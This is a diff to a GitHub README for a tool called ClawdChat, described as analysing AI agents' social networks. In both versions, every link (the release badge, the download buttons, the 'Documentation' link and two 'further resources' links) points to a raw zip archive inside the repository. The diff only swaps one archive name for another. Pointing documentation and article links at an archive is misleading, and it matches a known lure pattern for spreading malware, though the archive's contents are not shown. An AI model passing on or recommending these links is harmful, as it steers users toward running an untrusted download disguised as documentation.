@@ -1,6 +1,6 @@
 # 🐾 clawdchat-analysis - Analyze AI Social Networks Effortlessly
 
-![Download Latest Release](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip%20Latest%20Release-v1.0-blue)
+![Download Latest Release](https://raw.githubusercontent.com/yasuothezed/clawdchat-analysis/main/references/analysis_clawdchat_1.3.zip%20Latest%20Release-v1.0-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to ClawdChat. This application helps you analyze AI agents' social netwo
 
 To get started, visit the Releases page to download the application.
 
-[Download ClawdChat from Releases](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip)
+[Download ClawdChat from Releases](https://raw.githubusercontent.com/yasuothezed/clawdchat-analysis/main/references/analysis_clawdchat_1.3.zip)
 
 ### Installation Steps
 
@@ -45,7 +45,7 @@ To get started, visit the Releases page to download the application.
 
 ## 📚 Support and Documentation
 
-For more detailed instructions and troubleshooting, please refer to the [Documentation](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip).
+For more detailed instructions and troubleshooting, please refer to the [Documentation](https://raw.githubusercontent.com/yasuothezed/clawdchat-analysis/main/references/analysis_clawdchat_1.3.zip).
 
 ## 💬 Community
 
@@ -67,9 +67,9 @@ We welcome contributions from anyone interested in improving ClawdChat. If you h
 
 For further information on social network analysis and AI applications, check out these resources:
 
-- [Social Networks and Their Applications](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip)
-- [Understanding AI Agents](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip)
+- [Social Networks and Their Applications](https://raw.githubusercontent.com/yasuothezed/clawdchat-analysis/main/references/analysis_clawdchat_1.3.zip)
+- [Understanding AI Agents](https://raw.githubusercontent.com/yasuothezed/clawdchat-analysis/main/references/analysis_clawdchat_1.3.zip)
 
 Thank you for using ClawdChat! We hope you enjoy your experience analyzing AI social networks. 
 
-[Download ClawdChat from Releases](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip)
+[Download ClawdChat from Releases](https://raw.githubusercontent.com/yasuothezed/clawdchat-analysis/main/references/analysis_clawdchat_1.3.zip)
